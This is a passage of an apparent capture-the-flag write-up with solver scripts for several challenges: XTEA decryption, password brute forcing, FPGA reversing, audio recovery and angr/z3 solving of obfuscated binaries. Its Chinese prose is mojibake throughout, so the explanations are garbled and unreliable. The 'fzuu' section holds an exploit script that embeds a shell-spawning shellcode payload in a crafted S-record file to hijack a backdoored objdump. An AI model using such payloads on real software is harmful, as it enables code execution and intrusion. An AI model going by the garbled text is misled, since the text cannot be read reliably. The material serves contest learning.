            a[i][j] = tmp
            s.add(Or(tmp==0,tmp==255))

for i in range(20):
    for j in range(20):
        t = 0
        for ki in range(23):
            for ky in range(23):
                t += a[(103+i*23+ki)//11][(137+j*23+ky)//11]
        s.add(t >= b[i][j]*23*23)
        s.add(t < (b[i][j]+1)*23*23)
        

print(s.check())
m = s.model()
print(m)

for k,v in values.items():
    #print(m[v].as_long())
    a[k[0]][k[1]] = m[v].as_long()


newim = Image.new("RGB", (627,627))
for x in range(627):
    for y in range(627):
        i = x // 11
        j = y // 11
        rgb = (a[i][j],a[i][j],a[i][j])
        newim.putpixel((y,x),rgb)
newim.save("flag.png")
```

## minecRaft
ï¼ˆè¿™å“ªé‡Œæ˜¯webé¢˜äº†ï¼Œè¿™æ˜æ˜æ˜¯reverseé¢˜ï¼‰

æµè§ˆå™¨æ‰“å¼€F12ï¼Œç†Ÿæ‚‰çš„åè°ƒè¯•å’Œå˜é‡åï¼Œåº”è¯¥æ˜¯sojsonçš„æ··æ·†ã€‚  
ï¼ˆæ­£å¥½ä¹‹å‰å†™ä¸€ä¸ªçˆ¬è™«æ—¶æè¿‡ä¸€ç‚¹è¿™ä¸ªjsæ··æ·†ï¼‰  

æ£€æŸ¥é€»è¾‘åœ¨flag.jsé‡Œã€‚æ¸…æ‰å®šæ—¶å™¨ `for(i=1;i<=10000;i++){clearInterval(i);}` å°±èƒ½è°ƒè¯•äº†ã€‚_0x22517då¸¦æ•´æ•°è¿”å›çš„å°±æ˜¯å­—ç¬¦ä¸²å­—é¢é‡ï¼Œåœ¨consoleé‡Œè·‘ä¸€ä¸‹å³å¯ã€‚  
codeå‡½æ•°æ˜¯XTEAåŠ å¯†ï¼Œæœªç»ä»»ä½•ä¿®æ”¹ï¼Œæå–å¯†é’¥å’ŒåŠ å¯†åçš„æ¯”è¾ƒæ•°æ®ï¼Œè§£å¯†å³å¯ã€‚  

```python
def p32(n):
    n &= 0xffffffff
    return n.to_bytes(4, 'little')

def u32(s):
    assert len(s) == 4
    return int.from_bytes(s, 'little')

from ctypes import *

def xtea_encrypt(v, k):
    v0 = c_uint32(v[0])
    v1 = c_uint32(v[1])
    delta = 0x9E3779B9
    s = c_uint32(0)
    
    n = 32
    w = [0,0]

    while(n>0):
        v0.value += (((v1.value << 4) ^ (v1.value >> 5)) + v1.value) ^ (s.value + k[s.value & 3])
        s.value += delta
        v1.value += (((v0.value << 4) ^ (v0.value >> 5)) + v0.value) ^ (s.value + k[(s.value>>11) & 3])
        #print(sum.value, y.value, z.value)
        n -= 1

    w[0] = v0.value
    w[1] = v1.value
    return w

def xtea_decrypt(v, k):
    v0 = c_uint32(v[0])
    v1 = c_uint32(v[1])
    delta = 0x9E3779B9
    s = c_int32((delta * 32) & 0xffffffff)
    n = 32
    w = [0,0]

    while(n>0):
        v1.value -= (((v0.value << 4) ^ (v0.value >> 5)) + v0.value) ^ (s.value + k[(s.value>>11) & 3])
        s.value -= delta
        v0.value -= (((v1.value << 4) ^ (v1.value >> 5)) + v1.value) ^ (s.value + k[s.value & 3])
        n -= 1

    w[0] = v0.value
    w[1] = v1.value
    return w


k = (u32(b'1356'), u32(b'8531'), u32(b'4905'), u32(b'4377'))    # '1356853149054377'
finalv = ('6fbde674', '819a59bf', 'a1209256', '5b4ca2a7', 'a11dc670', 'c678681d', 'af4afb67', '04b82f0c') # '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c'
finalv = [int(s, 16) for s in finalv]

print(k)
print(finalv)
print(xtea_encrypt((u32(b'0123'), u32(b'4567')), k))

flag = b""
for i in range(0, 8, 2):
     r0, r1 = xtea_decrypt((finalv[i], finalv[i+1]), k)
     print(p32(r0), p32(r1))
     flag += p32(r0)+p32(r1) 

print(flag)
```


## å¯†ç ç”Ÿæˆå™¨

upx -d è„±å£³ï¼ŒIDAæ‰“å¼€å‘ç°æ˜¯é™æ€é“¾æ¥çš„qtç¨‹åºï¼Œå¤ªå¤æ‚äº†å®åœ¨æ˜¯æ‰¾ä¸åˆ°å…³é”®ç‚¹åœ¨å“ªé‡Œã€‚  
é¢˜ç›®å¤„å¤„æš—ç¤ºäº†éšæœºæ•°ç”Ÿæˆä¸æ—¶é—´ç›¸å…³ï¼Œä»£ç é‡Œæ‰¾time64å‡½æ•°çš„äº¤å‰å¼•ç”¨ï¼Œå®šä½åˆ° sub_BC9320 å‡½æ•°ï¼ŒåŠ¨æ€è°ƒè¯•ç¡®è®¤è¿™å°±æ˜¯éšæœºå¯†ç ç”Ÿæˆçš„åœ°æ–¹ã€‚  
è¯•å›¾æŠŠç®—æ³•æå–å‡ºæ¥å‘ç°è¿˜æ˜¯åšä¸åˆ°ï¼Œä½†è‡³å°‘èƒ½é€šè¿‡åœ¨è°ƒè¯•å™¨é‡Œæ”¹time64å‡½æ•°çš„è¿”å›å€¼ç”Ÿæˆä»»æ„æ—¶é—´æˆ³ä¸‹çš„å¯†ç äº†ã€‚  

ç½‘é¡µæç¤ºçš„æ³¨å†Œæ—¶é—´æ˜¯ "åŒ—äº¬æ—¶é—´  2021-09-22 23:11"ï¼ˆæ—¶é—´æˆ³ 1632323480ï¼‰ï¼Œåœ¨è¿™å‰åä¸€ä¸ªä¸€ä¸ªæ‰‹è¯•ã€‚
```
1632323490 RRJO~HU7HBCMABPe
1632323489 1Er1XnkL!NPBjwcM
1632323488 eC-FNPUNYFAEA1mc
1632323487 J}LPD6rFD!HqABKa
1632323486 g8JEyCPpP3hV!tJH
1632323485 7eB)CFngcGRBGFdS
1632323484 ^QBHI1ADoJOISGCj
1632323483 QrzR2UEOIiQZA&NZ
1632323482 JMEvcAL1Ap(vSHLJ
1632323481 ~F-SOQP3BZIamb5V

1632323480 HHAFET!LLLE4sAAq
1632323479 giP2I*bfNV_pFQ)O
1632323478 1SIpEeFFE`MC)BJL
1632323477 HI2GhFSJCSX7ALv~
1632323476 N^RaeLCmMPAGR9E>
1632323475 U~WO4jEpGBlMS{TC
1632323474 CLbCOFLM1keT_KKz
1632323473 $#OKnP(L5RcUtI+Y
1632323472 @(h65JEXpG0N{Gpg
1632323471 IdDjCOTAVa0/2GAI

1632323470 P7DD1GBBKn*zsQKC
1632323469 JrICDVG0ACS@Ptbv
1632323468 EFXH"hLFohDA>6!B
1632323467 Bl+P8XqyLmeOR~H+
1632323466 {BYRBYX%A4IkANtn
1632323465 iowOKEe@Db0Lb_mV
1632323464 cCC^Q9LtUSBqgGUA
1632323463 HH2_JHH$CLVGacDC 
1632323462 YtbZQA{_BF2aJ}NE
1632323461 /sD8qMrmII7Ex$Hk


1632323460 g7ELNM%IgOs9ESWx    // *
1632323459 Q9wUh-GLfBCaBJ3N
1632323458 AaCFFT{Ak1oWxF&M
1632323457 BuAdI%J1XJRLozMd
1632323456 KUjIBpEBGCIhN#2f
1632323455 ~MBXa9VLudcLB>hD
1632323454 $Z=CBDL7TjHu~mEX    // correct
```

å‘åè¯•äº†å¾ˆå¤šï¼Œç»“æœæ­£ç¡®çš„å¯†ç æ˜¯åœ¨å‘å‰çš„æ—¶é—´ç”Ÿæˆçš„ã€‚


## å¤–æ˜Ÿäººçš„éŸ³æ¸¸æŒæœº

æ‰¾åˆ°äº†ICE40æ¿å­çš„é€†å‘å·¥å…· [IceStorm](https://github.com/YosysHQ/icestorm )ï¼ŒæŠŠbitstreamè½¬æ¢ä¸ºverilogä»£ç ã€‚  
å¯¹äº wire çš„ assign æ“ä½œæ˜¯å¯ä»¥å†…è”åŒ–ç®€çš„ï¼Œå†™äº†ä¸ªå°ç¨‹åºæŠŠå®ƒä»¬è½¬æ¢æˆCè¯­è¨€çš„å®ï¼š
```
with open("bitstream_stripped.v", "r") as f:
    lines = f.readlines()

c_global_vars = []
c_wires = []

c_macro_exprs = []
c_assign_exprs = []
c_on_posedges = []

for line in lines:
    line = line.strip()
    if not line:
        continue
    if "/*" in line:
        t1 = line.index("/*")
        t2 = line.index("*/ ", t1)+3
        line = line[:t1]+line[t2:]
    line = line.replace("1'b0", "0")
    line = line.replace("1'b1", "1")
    line = line.replace("<=", "=")

    if line.startswith("module"):
        c_global_vars.extend(["clk", "btn1", "tx", "led", "btn2", "btn3", "btn4"])
    elif line.startswith("wire"):
        tokens = line.replace(",", "").replace(";", "").split()[1:]
        for t in tokens:
            if t not in c_global_vars and t not in c_wires:
                c_wires.append(t)
    elif line.startswith("reg"):
        tokens = line.replace(",", "").replace(";", "").split()[1:]
        for t in tokens:
            if t.startswith("n") and t not in c_global_vars and t not in c_wires:
                c_global_vars.append(t)
    elif line.startswith("assign"):
        assert line.endswith(";")
        var = line.split()[1]
        expr = line[line.index(" = ")+3:-1]
        if var in c_global_vars:
            c_assign_exprs.append(f'{var} = {expr}')
        elif var in c_wires:
            c_macro_exprs.append(f'#define {var} ({expr})')
        else:
            assert 0, var
    elif line.startswith("always @(posedge clk) "):
        assert line.endswith(";")
        expr = line[len("always @(posedge clk) "):-1]
        c_on_posedges.append(expr)
    elif line.startswith("endmodule"):
        pass
    else:
        assert 0, line

with open("bitstream_converted.c", "w") as f:
    f.write("""#include <stdio.h>
#include <stdbool.h>

""")
    for expr in c_macro_exprs:
        f.write(expr+"\n")

    for var in c_global_vars:
        f.write(f"bool {var};\n")

    f.write("\n")
    for i, expr in enumerate(c_on_posedges):
        f.write(f"""__attribute__((__used__))
void on_posedge_{i}(void) {{
    {expr};
}}

""")
    
    f.write("""
int main(void) {
""")

    for expr in c_assign_exprs:
        f.write(f"    {expr};\n")

    f.write("""
    return 0;
}
""")
```
ç„¶åç¼–è¯‘ï¼ˆ-g -O0ï¼‰å†IDAåç¼–è¯‘çœ‹ï¼Œæ²¡æœ‰äº†wireå˜é‡çš„å¹²æ‰°ï¼Œè§¦å‘ledäº®çš„é€»è¾‘å°±éå¸¸æ¸…æ™°äº†ã€‚  

ä¸ledæœ‰å…³çš„å‡½æ•°ï¼š
```c

void __cdecl on_posedge_20()
{
  bool v0; // al

  if ( btn1 )
  {
    v0 = n222;
    if ( n221 && n219 && n220 )
      v0 = !n222;
    n222 = v0;
  }
}

void __cdecl on_posedge_58()
{
  bool v0; // al

  if ( btn1 )
  {
    v0 = n221;
    if ( n219 && n220 )
      v0 = !n221;
    n221 = v0;
  }
}

void __cdecl on_posedge_30()
{
  bool v0; // al

  if ( btn1 )
  {
    v0 = n219;
    if ( n220 )
      v0 = !n219;
    n219 = v0;
  }
}

void __cdecl on_posedge_64()
{
  if ( btn1 )
    n220 ^= 1u;
}

void __cdecl on_posedge_48()
{
  n223 = btn2;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  bool v3; // al

  if ( n222 && n221 && n220 && !n219 )
  {
    if ( btn3 && !btn4 )
    {
      if ( n223 )
        v3 = !btn2;
      else
        v3 = btn2;
    }
    else
    {
      v3 = 0;
    }
  }
  else
  {
    v3 = 0;
  }
  led = v3;
  tx = !n32;
  return 0;
}
```

\[n222, n221,n219,n220\] æ˜¯ä¸€ä¸ª4ä½ç´¯åŠ å™¨ï¼Œè®°å½•btn1æŒ‰ä¸‹çš„æ¬¡æ•°ï¼›ledäº®éœ€è¦btn1æŒ‰ä¸‹13æ¬¡ï¼Œbtn3é•¿æŒ‰ï¼Œbtn4æœªæŒ‰ï¼Œbtn2æ¯ä¸ªä¸Šå‡æ²¿è¿‡åå€¼è¦åè½¬ã€‚  
çœ‹é¢˜è§£ç”¨çš„éƒ½æ˜¯Icarusä»¿çœŸå™¨ã€‚æˆ‘ç”¨äº†verilatorï¼Œæ— è®ºæ€ä¹ˆè°ƒï¼Œæ—¶é’Ÿä¸Šå‡æ²¿ä¹‹åçš„1nsæœŸé—´ledæ€»æ˜¯ç­çš„ï¼ˆå°½ç®¡å…¶ä»–æ—¶åˆ»èƒ½äº®ï¼‰ï¼Œä¸²å£ä¹Ÿæ²¡æœ‰è¾“å‡ºã€‚  


## JUST BE FUN
ç”¨ä¸€ä¸ªä¸‰ç»´pcåŸºäºæ ˆçš„è¯­è¨€å†™ä¸€ä¸ªå¯„å­˜å™¨ã€‚æ²¡æœ‰å…¨å±€å˜é‡å’Œå¯„å­˜å™¨åªæœ‰æ ˆå†™èµ·æ¥å¯èƒ½ä¼šæœ‰å›°éš¾ï¼Œè€Œä¸”é¢„æœŸå†™å‡ºæ¥å·¥ä½œé‡åº”è¯¥å¾ˆå¤§ï¼Œä¸æƒ³å†™ã€‚  


## fzuu
åˆè¯•afl  

å†…æ ¸é€‰é¡¹ `echo core /proc/sys/kernel/core_pattern` å¿…é¡»è¦è°ƒï¼Œä¹‹å‰å¿½ç•¥äº†è¿™ä¸ªé—®é¢˜å¯¼è‡´å§‹ç»ˆæ²¡æœ‰è·‘å‡ºç»“æœã€‚  

åˆå§‹è¾“å…¥ç”¨ä¾‹ç›´æ¥ç”¨é¢˜ç›®ç»™çš„`fuzz_in`å³å¯ï¼Œæ— éœ€æ·»åŠ å…¶ä»–ç”¨ä¾‹ã€‚  
```shell
afl-fuzz -i fuzz_in -o fuzz_out/ ./objdump_afl -d @@
```
åå‡ åˆ†é’Ÿåæ‰¾åˆ°äº†ç¬¬ä¸€ä¸ªcrashç”¨ä¾‹ï¼š
```
00000000: 5331 3031 7551 675b 6b5f 1804            S101uQg[k_..
```

bugåœ¨0xf9626ï¼Œå¯¹ç…§æºç ï¼Œæ˜¯è§£æ S-record fileæ—¶ï¼ŒåŸæœ¬çš„min_bytesæ˜¯3ï¼Œä½†è¿™é‡Œå¼ºè¡ŒæŒ‡å®šä¸ºäº†1ã€‚  
srec_scan_helperä¹Ÿæ˜¯äººä¸ºæ·»åŠ çš„å‡½æ•°ï¼Œè¯»å…¥ä¸€æ®µshellcodeç„¶åæ‰§è¡Œï¼ˆchecksecæ£€æŸ¥äº†ä¸€ä¸‹å‘ç°æ²¡å¼€NXï¼‰ã€‚  


```python
from pwn import *
import base64

context.arch = "amd64"

shellcode = asm(shellcraft.sh())

fileheader = b"S100??"

assert b"\xff" not in shellcode

print(base64.b64encode(fileheader+shellcode+bytes([0xff])))
```


## pğŸ˜­q

æŸ¥æ–‡æ¡£ï¼Œè°ƒç”¨apiæŠŠæ¯ä¸ªæ­¥éª¤éƒ½åè¿‡æ¥åšä¸€éå³å¯ã€‚  

(æ²¡æœ‰æ³¨æ„åˆ°librosa.feature.inverse.mel_to_audioæ¥å£ï¼Œå‚è€ƒ [https://stackoverflow.com/questions/56931834/creating-wave-data-from-fft-data/57323359#57323359](https://stackoverflow.com/questions/56931834/creating-wave-data-from-fft-data/57323359#57323359 )ç”¨äº†mel_to_stftå’Œgriffinlimä¸¤ä¸ªåˆ†æ­¥æ¥å£)  

```
from PIL import Image, ImageSequence
import numpy
import librosa
import soundfile

im = Image.open("flag.gif")
it = ImageSequence.Iterator(im)

frames = []
for imgframe in it:
    imgframe = imgframe.convert("RGB")
    frame = []
    for x in range(3, 129, 4):
        y = 91
        while True:
            rgb = imgframe.getpixel((x,y))
            #print(rgb)
            if rgb == (255,0,0):
                y -= 1
            else:
                break
        frame.append(30-y+1)
    #print(frame)
    frames.append(frame)

frames = numpy.array(frames)
spectrogram = frames.transpose()

mel_spec = librosa.db_to_power(spectrogram)


S_inv = librosa.feature.inverse.mel_to_stft(mel_spec, sr=22050, n_fft=2048)
y_inv = librosa.griffinlim(S_inv, n_iter=32, hop_length=512)

soundfile.write('inv.wav', y_inv, samplerate=22050)
```

ä¹‹åæ˜¯è‹±è¯­å¬åŠ›ï¼Œåå¤å¬äº†å¾ˆå¤šéæ‰è¾¨è®¤å‡ºå¤§æ•°å­—çš„è‹±æ–‡è¯»æ³•ã€‚  


## Make a wish
æ²¡çœ‹


## è¶… OI çš„ Writeup æ¨¡æ‹Ÿå™¨

ï¼ˆçœ‹äº†å¦å¤–ä¸¤äººçš„é¢˜è§£ï¼Œæ‰çŸ¥é“åŸæ¥è¾“å‡ºçš„ä½ä½åªä¸è¾“å…¥çš„ä½ä½æœ‰å…³ï¼Œæ˜¯å¯ä»¥é€ä½çˆ†ç ´çš„â€¦â€¦ï¼‰

### æœç„¶è¿˜æ˜¯é€†å‘æ¯”è¾ƒç®€å•
0.binè¿˜æ˜¯è¦æ‰‹é€†çš„  
```
unsigned __int64 __fastcall sub_1160(__int64 a1, __int64 a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rdi
  __int64 i; // [rsp+8h] [rbp-40h]

  for ( i = a2 ^ a1; ; i -= 0x20750C1F7E22FC87LL )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( i > 0x4608879D20993EDBLL )
        {
          if ( i > 0x69F330635DD21BC6LL )
          {
            if ( i == 0x69F330635DD21BC7LL )
            {
              i = 0x21F6E214B0187F72LL;
              a4 ^= a3;
            }
            else
            {
              if ( i != 0x6EAE81CD1556CB1ALL )
                goto LABEL_2;
              i = 0x21F6E214B0187F72LL;
              a4 *= a4 ^ a3;
            }
          }
          else if ( i == 0x4608879D20993EDCLL )
          {
            i = 0x21F6E214B0187F72LL;
            a4 &= a4 ^ a3;
          }
          else
          {
            if ( i != 0x54D84F78B9ACB5A3LL )
              goto LABEL_2;
            i = 0x21F6E214B0187F72LL;
            a4 |= a4 ^ a3;
          }
        }
        if ( i > 0x21F6E214B0187F71LL )
          break;
        if ( i == 0x95C64E934D54CD6CLL )
        {
          i = 0x21F6E214B0187F72LL;
          a4 = (a3 & 0x5D0753764802B909LL ^ 0x4907405648003001LL | (0x5D0753764802B909LL * a3) ^ 0x485B974538C1747BLL | a4 & 0xA318E5ACC4A3ACCDLL ^ 0x308012840032845LL | (0xA318E5ACC4A3ACCDLL * a4) ^ 0x387BC2860C2CEABLL) != 0;
        }
        else
        {
          if ( i != 0xAE6475F8F6E6E88ALL )
            goto LABEL_2;
          i = 0x21F6E214B0187F72LL;
          a4 += a3;
        }
      }
      if ( i != 0x3C5E6316F4D2B25ALL )
        break;
      i = 0x21F6E214B0187F72LL;
      a4 = a3;
    }
    if ( i == 0x21F6E214B0187F72LL )
      break;
LABEL_2:
    v4 = a3 ^ ((a4 ^ 0x2A500606480A22LL) & 0x836A518756E88F32LL | 1);
    a3 = a4;
    a4 = v4;
  }
  return a4;
}
```

æ§åˆ¶æµåªä¸a1,a2æœ‰å…³ï¼Œä¸a3,a4æ— å…³ã€‚é¢˜ç›®ä¸­a1,a2æ€»æ˜¯å¸¸é‡ï¼Œæ‰€ä»¥æ§åˆ¶æµå…¶å®æ˜¯å®Œå…¨ç¡®å®šçš„ã€‚  
åŠ¨æ€è°ƒè¯•ï¼Œå‘ç°åªæœ‰LABEL_2ä¸‹é¢çš„ä¸‰è¡Œä»£ç æ˜¯æ¯è½®éƒ½ä¼šæ‰§è¡Œçš„ï¼›æ‰§è¡Œ15è½®åè¿›å…¥i == 0x95C64E934D54CD6CLLçš„åŸºæœ¬å—ï¼Œç„¶åè¿”å›ã€‚  

15è½®ä¸»å¾ªç¯æ˜¯Feistelå¯†ç ç»“æ„ï¼Œæœ€åä¸€ä¸ªåŸºæœ¬å—ç”¨z3æ±‚é€†ï¼Œç„¶ååå‘è¿­ä»£Feistel

```python
from z3 import *

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, 'little')

a3 = BitVec("a3", 64)
a4 = BitVec("a4", 64)


s = Solver()
s.add((a3 & 0x5D0753764802B909) ^ 0x4907405648003001 == 0)
s.add((0x5D0753764802B909 * a3) ^ 0x485B974538C1747B == 0)
s.check()
a3 = s.model()[a3].as_long()

s = Solver()
s.add((a4 & 0xA318E5ACC4A3ACCD) ^ 0x308012840032845 == 0)
s.add((0xA318E5ACC4A3ACCD * a4) ^ 0x387BC2860C2CEAB == 0)
s.check()
a4 = s.model()[a4].as_long()

for i in range(15):
    a3, a4 = a4 ^ ((a3 ^ 0x2A500606480A22) & 0x836A518756E88F32 | 1) , a3

print(hex(a3), hex(a4))

flag = p64(a3)+p64(a4)

print(flag)
```


### è¿™æ¬¡æ²¡äººä¸¤å°æ—¶æ‰‹åšå§

éå†é¢˜ç›®æ¥å£ï¼Œå‘ç°å…±256ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆ0.bin -> 255.binï¼‰ï¼Œå…¨éƒ¨æä¸‹æ¥ï¼š
```shell
for i in $(seq 0 256)
do
curl "http://202.38.93.111:13768/challenge/${i}.bin" \
  -O \
  -H 'Cookie: <>' \
  --compressed \
  --insecure
done
```

1.bin - 15.bin è¿˜æ˜¯åœ¨ angr çš„æ±‚è§£èƒ½åŠ›å†…çš„ã€‚æœç´¢ç½‘ä¸Šçš„ä¸­æ–‡æ–‡ç« ï¼Œç»å¤§å¤šæ•°éƒ½æ˜¯æŠ„æ¥æŠ„å»çš„é‚£ä¸ªä»¥stdinä½œä¸ºç¬¦å·è¾“å…¥ã€ä»¥stdoutä½œä¸ºçº¦æŸçš„ä¾‹å­â€¦â€¦åªå¥½å»è¯»å®˜æ–¹æ–‡æ¡£çœ‹ç¬¦å·å˜é‡æ€ä¹ˆå®šä¹‰ã€‚  
ä»¥1.binä¸ºä¾‹ï¼Œ
```
__int64 __fastcall sub_15C0(__int64 a1, __int64 a2)
{
  return sub_1160(0x3C1AE68A57BEDAE5LL, 0x574402173F80BF95LL, a1, a2);
}
```
ç¬¦å·æ‰§è¡Œçš„èŒƒå›´ä»…é™äºæ­¤å°±å¯ä»¥äº†ï¼ŒæŠŠa1å’Œa2è®¾ä¸ºç¬¦å·å˜é‡ï¼Œæ±‚è§£çº¦æŸæ˜¯è¿”å›å€¼ï¼ˆraxï¼‰ç­‰äº0ã€‚  

å¦‚ä½•æ‰¾åˆ°sub_15C0å‡½æ•°çš„ä½ç½®ï¼šæ¯”è¾ƒç²—æš´ï¼Œç›´æ¥æœç´¢call sub_1160å‰çš„å­—èŠ‚ç ï¼Œç„¶ååŠ ä¸Šsub_15C0å‡½æ•°çš„å¤§å°ï¼ˆæ˜¯å›ºå®šå€¼ï¼‰ã€‚  

```python
import sys
import angr
import claripy
import logging

def p64(n):
    n &= (1<<64)-1
    return n.to_bytes(8, "little")

logging.getLogger('angr').setLevel("CRITICAL")

filename = sys.argv[1]
print(filename)
with open(filename, "rb") as f:
    allcontent = f.read()

startaddr = allcontent.index(bytes.fromhex("50 48 89 F1 48 89 FA 48  BF".replace(" ", "")))
startaddr += 0x400000
endaddr = startaddr + 0x21
print(hex(startaddr), hex(endaddr))

proj = angr.Project(filename)
state = proj.factory.blank_state(addr=startaddr)
v0 = state.solver.BVS('v0', 64)
v1 = state.solver.BVS('v1', 64)
state.regs.rdi = v0
state.regs.rsi = v1
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=endaddr)
found = simgr.found[0]
found.add_constraints(found.regs.rax == 0)
r0 = found.solver.eval(v0)
r1 = found.solver.eval(v1)

print(r0, r1)
flag = p64(r0)+p64(r1)

print(flag.decode())
print()
```

å¤§çº¦2-3åˆ†é’Ÿèƒ½è§£å‡ºä¸€é¢˜ã€‚  

### ä»€ä¹ˆå«æ— æƒ…çš„é€†å‘æœºå™¨

ï¼ˆçœ‹äº†å‡ºé¢˜äººçš„é¢˜è§£æ„Ÿè§‰æˆ‘çš„è§£æ³•ä¹Ÿæ˜¯éé¢„æœŸï¼‰  

ä»16.binå¼€å§‹ï¼Œä¸Šé¢çš„ç¨‹åºå°±è§£ä¸åŠ¨äº†ï¼ˆæŒ‚æœºä¸€æ•´ä¸ªæ™šä¸Šï¼‰ã€‚  

æ³¨æ„åˆ° sub_1160 å†…éƒ¨æœ‰å¾ˆå¤šçº¯è®¡ç®—çš„å°åŸºæœ¬å—ï¼Œæ ¹æ®0.binçš„æ§åˆ¶æµï¼Œåˆç†çŒœæµ‹è¿™äº›åŸºæœ¬å—ä»…åœ¨é€’å½’è°ƒç”¨ä¸­æ‰ä¼šç»è¿‡ï¼Œä¸”æ‰€æœ‰çš„é€’å½’è°ƒç”¨åº”è¯¥éƒ½æ˜¯è¿™ç§ç®€å•çš„è®¡ç®—ã€‚  
ä¸»å¾ªç¯ä»ç„¶æ˜¯ç±»ä¼¼Feistelçš„ç»“æ„ã€‚  

z3è§£å¤šè½®Feistelæ˜¯è§£ä¸åŠ¨çš„ï¼Œä½†æ˜¯è§£å•è½®Feistelæ˜¯éå¸¸è½»æ¾çš„ã€‚é‰´äºæ­¤ï¼ŒçŒœæµ‹å¦‚æœæŠŠæ¯è½®çš„è½®å˜é‡éƒ½å•ç‹¬åˆ›å»ºä¸ºç¬¦å·å˜é‡ï¼Œç„¶åçº¦æŸä»…æ·»åŠ åˆ°ç›¸é‚»ä¸¤è½®çš„ç¬¦å·å˜é‡ä¸­ï¼Œä¸æ‰©æ•£åˆ°å…¶ä»–è½®ï¼Œåº”è¯¥å°±èƒ½æˆåŠŸæ±‚è§£ã€‚  

ä»¥ç»å…¸çš„TEAåŠ å¯†ä½œä¸ºä¾‹å­éªŒè¯è¿™ä¸ªçŒœæµ‹ï¼š  
```python
from z3 import *

def tea_encrypt(v, k):
    v0, v1 = v
    k0, k1, k2, k3 = k
    s = 0
    delta = 0x9e3779b9
    for i in range(32):
        s += delta
        s &= 0xffffffff
        v0 += ((v1 << 4) + k0) ^ (v1 + s) ^ ((v1 >> 5) + k1)
        v0 &= 0xffffffff
        v1 += ((v0 << 4) + k2) ^ (v0 + s) ^ ((v0 >> 5) + k3)
        v1 &= 0xffffffff
    return v0, v1


def tea_encrypt_z3(v, k):
    global ss
    v0, v1 = v
    k0, k1, k2, k3 = k
    s = 0
    delta = 0x9e3779b9
    for i in range(32):
        s += delta
        s &= 0xffffffff
        v0 += ( ((v1 << 4) + k0) ^ (v1 + s) ^ (LShR(v1, 5) + k1) )
        v0 &= 0xffffffff
        new_v0 = BitVec(f"tmp_{i}_v0", 32)
        ss.add(new_v0 == v0)
        v0 = new_v0
        v1 += ( ((v0 << 4) + k2) ^ (v0 + s) ^ (LShR(v0, 5) + k3) )
        v1 &= 0xffffffff
        new_v1 = BitVec(f"tmp_{i}_v1", 32)
        ss.add(new_v1 == v1)
        v1 = new_v1
    return v0, v1


v = [0x12345678, 0x9abcdef0]
k = [0x11111111, 0x22222222, 0x33333333, 0x44444444]

v0 = BitVec("v0", 32)
v1 = BitVec("v1", 32)

ss = Solver()
answer = tea_encrypt(v, k)
print(v, answer)

r0, r1 = tea_encrypt_z3([v0, v1], k)    # this is easy to be solved
# r0, r1 = tea_encrypt([v0, v1], k)    # this cannot be solved
ss.add(r0 == answer[0])
ss.add(r1 == answer[1])

print(ss.check())
print(ss.model())
```

å‘ç°ç¡®å®å¯è¡Œï¼ŒåŸæœ¬z3æ˜¯æ— æ³•æ±‚è§£32è½®çš„TEAåŠ å¯†çš„ï¼Œä½†æ˜¯ç»æ­¤å¤„ç†åç¬é—´å¯å‡ºç­”æ¡ˆã€‚  


æ ¹æ®è¿™ä¸ªæ€æƒ³ä¿®æ”¹ä¸Šä¸€å…³çš„angrä»£ç ï¼Œå…³é”®ç‚¹æ˜¯æ‰¾åˆ°Feistelè½®å˜é‡èµ‹å€¼çš„ä½ç½®ã€‚ä»¥255.binä¸ºä¾‹ï¼Œå³ä¸‹å›¾ä¸­ `a3 = a4` å’Œ `a4 = v39` ä¸¤æ¡æŒ‡ä»¤çš„ä½ç½®ï¼š  
```c
__int64 __fastcall sub_1160(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
    ...
LABEL_20:
    v26 = sub_1160(0x2C26BFF355716FE1LL, 0x4B13A095C11D2AFFLL, a4 + (a4 ^ 0x8C28FA7017742698LL), a4);
    v27 = sub_1160(0xA328DADAB4E1A1AFLL, 0x2AEEE0B23C833E92LL, v26, a4);
    v28 = sub_1160(0xEE8B2858DCEDE8BLL, 0x5A53BA0B3FE7BDB0LL, 0x744F213BC10F0FF3LL, v27);
    v29 = sub_1160(0x56A77408888A4CA1LL, 0x6D33F9CF21DB070ELL, v28 + v27, v27);
    v30 = sub_1160(0x683931D0BEFC9C51LL, 0xD2A4C84615C4546FLL, (v27 ^ v29) + v27, v27);
    v31 = sub_1160(0x8244D5725F3ACA47LL, 0xD2ECBC7C99F0AFC3LL, v30, v27);
    v32 = sub_1160(0xA66A26548DB46F55LL, 0xF9C5114BAE888450LL, 1LL, v31);
    v33 = sub_1160(0xE7D4EBEC2D077A9FLL, 0x79F7CA08B42CE372LL, v32 + v31, v31);
    v34 = sub_1160(0xB0022EF8CC267077LL, 0xF6642B02A718FC99LL, (v31 ^ v33) + v31, v31);
    v35 = sub_1160(0x7CFD6DCAB2B3060FLL, 0xF733B44E980C5C80LL, v34, v31);
    v36 = sub_1160(0x2C6A3644D365B895LL, 0x6DB46231C4193050LL, a3, v35);
    v37 = sub_1160(0x51E2D05DE772867LL, 0x69F934D298C02102LL, v36 + v35, v35);
    v38 = sub_1160(0x9CD919637A6710B3LL, 0x6AD7813A668969E5LL, (v35 ^ v37) + v35, v35);
    v39 = sub_1160(0x8042619DA648076FLL, 0xFE983D12A7C241BBLL, v38, v35);
    a3 = a4;
    v42 = sub_1160(0xF0CAE7A2FA83562DLL, 0x9F8138B7FE3942D0LL, v42, 0x97B611B8E17A05F5LL);
    a4 = v39;
	...
```
æœ‰ç‚¹å›°éš¾ï¼Œé™¤éè¿›è¡Œè¾ƒä¸ºæ·±å…¥çš„ç¨‹åºåˆ†æï¼ˆä¸ä¼šï¼‰ã€‚  
ä»ç„¶é‡‡ç”¨ç®€å•ç²—æš´çš„æ–¹æ³•ï¼šhookæ‰€æœ‰çš„å†…å­˜å†™å…¥ï¼Œåªè¦å¾…å†™å…¥çš„å€¼æ˜¯ç¬¦å·å˜é‡ï¼Œå°±åˆ›å»ºä¸€ä¸ªæ–°çš„ç¬¦å·å˜é‡ã€åŒæ—¶æ·»åŠ ä¸€æ¡æ–°è€å˜é‡ç›¸ç­‰çš„çº¦æŸã€‚  
